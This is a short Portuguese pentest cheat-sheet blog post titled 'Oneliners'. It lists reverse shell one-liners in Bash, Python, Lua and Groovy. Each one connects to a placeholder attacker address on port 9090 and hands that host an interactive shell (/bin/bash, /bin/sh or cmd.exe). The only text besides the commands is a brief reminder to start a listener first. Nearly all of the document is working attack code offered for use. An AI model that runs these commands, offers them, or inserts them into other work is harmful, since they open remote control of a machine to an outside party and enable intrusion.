---
title: Oneliners
author: Alan Lacerda
date: 2020-08-27 11:12:00 -0300
categories: [Pentest, Tricks]
tags: [oneliner, reverseshell]
math: true
---

## Reverse Shell
Obviamente antes de solicitar a conexão reversar o listener deve estar aberto na porta especificada no exemplo replicado.

### Bash
***
```terminal
bash -i >& /dev/tcp/<Meu.IP>/9090 0>&1
```

### Python
```terminal
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("Meu.IP",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
### Lua
```terminal
lua -e "require('socket');require('os');t=socket.tcp();t:connect('Meu.IP','9090');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### Groovy
```terminal
String host="Meu.IP";
int port=9090;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```